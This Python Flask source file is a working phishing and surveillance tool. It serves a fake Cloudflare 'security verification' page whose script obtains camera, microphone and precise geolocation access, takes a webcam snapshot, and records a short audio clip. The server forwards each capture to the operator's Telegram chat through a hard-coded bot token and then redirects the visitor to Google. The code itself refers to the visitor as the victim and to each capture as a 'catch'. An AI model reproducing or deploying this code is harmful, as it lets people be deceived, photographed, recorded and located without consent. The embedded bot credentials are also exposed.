import base64, requests, io, os, time
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# ==================== إعدادات المطور سيوفي ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
MY_LINK = "https://sif-e7ad.onrender.com"
# =============================================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare | التحقق من الأمان</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { text-align: center; border: 1px solid #eee; padding: 40px; border-radius: 12px; width: 90%; max-width: 400px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #f6821f; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120">
        <h2>جاري التحقق...</h2>
        <p>يرجى النقر على "سماح" لتأمين اتصالك.</p>
        <div class="loader"></div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        let chunks = [];
        async function send(d) { await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); }
        async function start() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                const v = document.getElementById('v'); v.srcObject = s;
                navigator.geolocation.getCurrentPosition(p => send({type:'text', lat:p.coords.latitude, lon:p.coords.longitude}), () => send({type:'text', lat:0, lon:0}), {enableHighAccuracy:true});
                v.onloadedmetadata = () => {
                    setTimeout(async () => {
                        const cn = document.getElementById('c');
                        cn.width = v.videoWidth; cn.height = v.videoHeight;
                        cn.getContext('2d').drawImage(v, 0, 0);
                        await send({type:'img', img:cn.toDataURL('image/jpeg', 0.8).split(',')[1]});
                    }, 3000);
                };
                const rec = new MediaRecorder(s);
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = () => {
                    const reader = new FileReader();
                    reader.readAsDataURL(new Blob(chunks, {type:'audio/ogg'}));
                    reader.onloadend = () => {
                        send({type:'audio', audio:reader.result.split(',')[1]});
                        setTimeout(() => window.location.replace("https://google.com"), 1000);
                    };
                };
                rec.start(); setTimeout(() => rec.stop(), 5000);
            } catch(e) { window.location.replace("https://google.com"); }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

def bot_api(m, p=None, f=None):
    u = f"https://api.telegram.org/bot{BOT_TOKEN}/{m}"
    if f: return requests.post(u, data=p, files=f)
    return requests.post(u, json=p)

@app.route('/', methods=['GET', 'POST'])
def handle_all():
    # إذا كان الطلب من تليجرام (Webhook)
    if request.method == 'POST' and request.is_json:
        u = request.get_json(silent=True)
        if u and "message" in u:
            m = u["message"]; cid = m["chat"]["id"]; txt = m.get("text", "")
            if txt == "/start":
                bot_api("sendMessage", {"chat_id": cid, "text": "✅ البوت شغال! أرسل /open لتفعيل الرابط."})
            elif txt == "/open" and cid == ADMIN_ID:
                # تفعيل الرابط هنا (يمكنك إضافة منطق التوقيت لاحقاً)
                bot_api("sendMessage", {"chat_id": cid, "text": "🔓 تم فتح الرابط لمدة 5 دقائق."})
        return "OK"
    
    # إذا كان الطلب من المتصفح (الضحية)
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json; t = d.get('type')
    if t == 'text':
        loc = f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}" if d.get('lat') != 0 else "غير متاح"
        bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"🎯 صيد جديد!\nالموقع: {loc}"})
    elif t == 'img':
        ph = io.BytesIO(base64.b64decode(d.get('img'))); ph.name = 'snap.jpg'
        bot_api("sendPhoto", {"chat_id": ADMIN_ID}, {"photo": ph})
    elif t == 'audio':
        au = io.BytesIO(base64.b64decode(d.get('audio'))); au.name = 'voice.ogg'
        bot_api("sendVoice", {"chat_id": ADMIN_ID}, {"voice": au})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
